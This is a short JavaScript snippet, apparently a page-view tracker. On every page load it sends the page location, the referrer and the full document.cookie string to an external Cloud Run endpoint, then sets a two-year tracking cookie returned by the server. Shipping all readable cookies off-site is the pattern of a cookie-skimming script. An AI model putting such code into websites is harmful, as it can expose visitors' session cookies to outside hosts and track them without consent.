async function collect(data) {
  data.location = window.location
  data.referrer = document.referrer
  data.cookies = document.cookie

  const url = 'https://requestapp-55p23hikza-uc.a.run.app/collect'
  const headers = new Headers()
  headers.append('Content-Type', 'application/json')

  const req = new Request(url, {
    method: 'POST',
    headers,
    body: JSON.stringify(data)
  })

  const resp = await fetch(req)
  const { cookie, message } = await resp.json()

  if (cookie) {
    const expirationDate = new Date()
    expirationDate.setFullYear(expirationDate.getFullYear() + 2)
    const expiresUTC = expirationDate.toUTCString()
    const newCookie = `brwa=${cookie}; expires=${expiresUTC}; path=/`
    document.cookie = newCookie
  }
}

collect({ type: 'page-view' })
